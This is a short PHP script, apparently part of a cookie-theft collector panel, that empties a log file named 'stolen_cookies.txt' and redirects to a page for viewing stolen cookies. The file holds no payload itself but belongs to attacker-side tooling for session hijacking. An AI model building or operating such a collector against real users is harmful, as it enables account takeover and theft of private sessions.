<?php
/**
 * 清空窃取的Cookie数据
 * 
 * @author  Guojin0826
 * @email   jinrcsy@gmail.com
 * @github  https://github.com/Guojin0826
 */

$log_file = 'data/stolen_cookies.txt';
if(file_exists($log_file)) {
    file_put_contents($log_file, '');
}
header('Location: view_cookies.php');
exit;
?>